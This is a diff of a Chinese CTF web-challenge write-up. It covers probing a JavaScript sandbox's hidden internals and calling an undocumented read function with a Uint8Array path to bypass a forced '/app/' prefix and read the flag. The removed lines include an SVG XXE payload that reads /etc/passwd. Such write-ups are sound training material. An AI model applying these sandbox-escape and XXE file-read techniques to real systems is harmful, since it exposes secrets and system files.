 //["hash","strlen","platform","perf","encoding","_debug","_secrets","_internal"]
 ```
 
-可以发现runtime中`"_debug" "_secrets" "_internal"`这三个比较可疑
-
-分别列出其中可用函数
+可以发现runtime中`"_debug" "_secrets" "_internal"`这三个比较可疑，分别列出其中可用函数
 
 ```js
 export default {
@@ -873,17 +553,14 @@ export default {
         return new Response(JSON.stringify(keys));
     }
 };
-```
 
-```
+/******
 _debug : ["enabled","trace","dump","inspect"]
 _secrets : ["get","list"]
-_internal : ["debug","lib"]
+_internal : ["debug","lib"] ******/
 ```
 
-没啥发现，挨个看看
-
-在看到_internal.lib.symbols时
+接着向下探测，发现lib下面有个symbols
 
 ```js
 export default {
@@ -897,9 +574,7 @@ export default {
 //["_0x72656164","_0x6c697374"]
 ```
 
-0x开头推测是16进制，解码一下分别是read和list
-
-尝试直接调用read函数读/flag
+0x72656164就是read啊，我们尝试用它读文件
 
 ```js
 export default {
@@ -913,17 +588,7 @@ export default {
 //"ERROR: The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received \"/app/\\u0000\\u0000\\u0000\\u0000\\u0000\""
 ```
 
-错误信息告诉我们几个重要信息：
-
-1. **路径被修改了**：我们传入的是`"/flag"`，但系统收到的是`"/app/\u0000\u0000..."`
-2. **支持Uint8Array**：错误说参数可以是string、Uint8Array或URL
-3. **null bytes问题**：路径中出现了`\u0000`（空字符）
-
-**推测**：
-
-- 系统在处理字符串路径时，会在前面加上`/app/`
-- 可能因为某些内存对齐问题，后面跟着空字节
-- 但如果使用Uint8Array，可能绕过这个处理
+这里提示我们系统在处理路径会自己加上/app/，参数可以是string、Uint8Array或URL，我们试试用Uint8Array
 
 ```js
 export default {
@@ -939,26 +604,6 @@ export default {
 //xmctf{......}
 ```
 
-拿到flag
+## 醉里挑灯看剑
 
-## 头像上传器
-
-一个用户界面支持上传头像（.svg/.png）,在/api/avatar.php可以查看渲染的头像
-
-尝试一下svg xxe
-
-```php
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
-</svg>
-```
-
-也是成功读到了
-
-## 总结
-
-比赛就Web一个方向还是不错的，题目有难度梯度知识面也很广，对我这种蒟蒻来说很友好，可以练习一下已经学过的知识也可以拓展知识面，学习了TS、js沙箱、MCP等知识，以后有时间一定把剩下的题看一看。。。
+真不会typescript，等学了再来看这个题吧
